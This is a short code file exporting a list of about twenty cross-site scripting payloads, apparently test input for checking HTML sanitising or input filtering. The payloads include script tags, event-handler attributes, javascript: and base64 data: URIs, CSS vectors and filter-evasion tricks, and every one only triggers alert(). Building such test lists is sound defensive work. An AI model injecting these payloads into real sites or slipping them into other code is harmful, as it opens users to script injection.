export const basicXSSPayloads = `
<script>alert('XSS');</script>
<img src="x" onerror="alert('XSS');">
<a href="javascript:alert('XSS')">Click me</a>
<div onmouseover="alert('XSS')">Hover over me</div>
<input type="text" value="<img src='x' onerror='alert(1)'>">
<scr<script>ipt>alert('XSS');</scr</script>ipt>
<style>@import'javascript:alert("XSS")';</style>
<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=">Click me</a>
<svg><script>alert('XSS')</script></svg>
<div style="width: expression(alert('XSS'));"></div>
<iframe src="javascript:alert('XSS');"></iframe>
<iframe src="javascript:alert('XSS');"></iframe>
<object data="javascript:alert('XSS');"></object>
<img src="x" onerror="alert('XSS')">">
<script>alert('XSS')
<a href="javascript:alert('XSS')"
";alert('XSS');//</script><img src=x onerror=alert('XSS')>
<style>body{background:url('javascript:alert("XSS")')}</style>
`;
